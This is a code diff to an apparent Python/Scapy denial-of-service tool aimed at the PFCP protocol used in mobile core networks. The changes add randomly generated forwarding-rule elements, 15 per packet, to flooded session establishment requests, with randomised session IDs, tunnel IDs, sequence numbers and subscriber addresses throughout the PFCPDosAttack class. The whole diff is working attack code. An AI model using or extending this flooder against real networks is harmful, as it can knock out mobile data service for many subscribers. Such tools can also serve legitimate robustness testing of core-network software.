@@ -37,6 +37,21 @@ class Ez_PFCP:
             self.seq = 1
         return seq
     
+    
+    def Random_create_far(self):
+        return IE_CreateFAR(
+            IE_list=[
+                IE_FAR_Id(id=random.randint(1, 255)),
+                IE_ApplyAction(FORW=1),
+                IE_OuterHeaderCreation(
+                    GTPUUDPIPV4=1, 
+                    TEID=random.randint(1, 0xFFFFFFFF),
+                    ipv4=".".join(str(random.randint(1, 254)) for _ in range(4)),
+                    port=2152
+                )
+            ]
+        )
+    
     def Build_PFCP_association_setup_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None):
         src_addr = src_addr or self.src_addr
         dest_addr = dest_addr or self.dest_addr
@@ -62,7 +77,7 @@ class Ez_PFCP:
         return packet
     
     def Build_PFCP_session_establishment_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None,
-                                            seid=0x1, ue_addr=None, teid=0x11111111, precedence=255, interface=1, random_seq=False):
+                                            seid=0x1, ue_addr=None, teid=0x11111111, precedence=255, interface=1, random_seq=False, random_far_number=0):
         src_addr = src_addr or self.src_addr
         dest_addr = dest_addr or self.dest_addr
         src_port = src_port or self.src_port
@@ -104,6 +119,10 @@ class Ez_PFCP:
             S=1,
             seq=seq
         ) / ie_nodeid / ie_fseid / ie_createpdr / ie_createfar
+        
+        if random_far_number:
+            for i in range(random_far_number):
+                pfcp_msg = pfcp_msg / Raw(bytes(self.Random_create_far()))
 
         pkt = IP(src=src_addr, dst=dest_addr) / UDP(sport=src_port, dport=dest_port) / pfcp_msg
         pkt = pkt.__class__(bytes(pkt))  # Recalcul final
@@ -132,7 +151,7 @@ class Ez_PFCP:
             
             
     def Send_PFCP_session_establishment_req(self, src_addr=None, dest_addr=None, src_port=None, dest_port=None,
-                                            seid=0x1, ue_addr=None, teid=0x11111111, precedence=255, interface=1, random_seq=False):
+                                            seid=0x1, ue_addr=None, teid=0x11111111, precedence=255, interface=1, random_seq=False, random_far_number=0):
         src_addr = src_addr or self.src_addr
         dest_addr = dest_addr or self.dest_addr
         src_port = src_port or self.src_port
@@ -150,7 +169,8 @@ class Ez_PFCP:
             teid=teid,
             precedence=precedence,
             interface=interface,
-            random_seq=random_seq
+            random_seq=random_seq,
+            random_far_number=random_far_number
         )
         send(pfcp_session_establishment_req)
         if self.verbose:
@@ -211,16 +231,16 @@ class PFCPDosAttack:
         else:
             print("[DoS]Verbose mode disabled")
     
-    def new_ue_addr(self):
-        if self.randomize:
+    def new_ue_addr(self, randomize=False):
+        if self.randomize or randomize:
             return ".".join(str(random.randint(1, 254)) for _ in range(4))
 
         next_ip = self.ue_base_addr + self._ue_counter
         self._ue_counter += 1
         return str(next_ip)
     
-    def new_seq(self):
-        if self.randomize:
+    def new_seq(self, randomize=False):
+        if self.randomize or randomize:
             seqNbr = random.randint(1, 0xFFFFFFFF)
             return seqNbr
         
@@ -231,8 +251,8 @@ class PFCPDosAttack:
                 self.seq = 1
             return seq
     
-    def new_seid(self):
-        if self.randomize:
+    def new_seid(self, randomize=False):
+        if self.randomize or randomize:
             self.seid = random.randint(1, 0xFFFFFFFFFFFFFFFF)
             return self.seid
         
@@ -242,8 +262,8 @@ class PFCPDosAttack:
             self.seid_counter = 1
         return seid
     
-    def new_teid(self):
-        if self.randomize:
+    def new_teid(self, randomize=False):
+        if self.randomize or randomize:
             self.teid = random.randint(1, 0xFFFFFFFF)
             return self.teid
         
@@ -252,6 +272,8 @@ class PFCPDosAttack:
         if self.teid_counter > 0xFFFFFFFF:
             self.teid_counter = 1
         return teid
+    
+
     
     def prepare_pfcp_session_establishment_flood(self, count):
         print(f"[DoS] Preparing {count} PFCP session establishment packets")
@@ -283,7 +305,8 @@ class PFCPDosAttack:
                     seid=self.new_seid(), 
                     ue_addr=self.new_ue_addr(),
                     teid=self.new_teid(),
-                    random_seq=self.randomize
+                    random_seq=self.randomize,
+                    random_far_number=15
                 )
                 
             
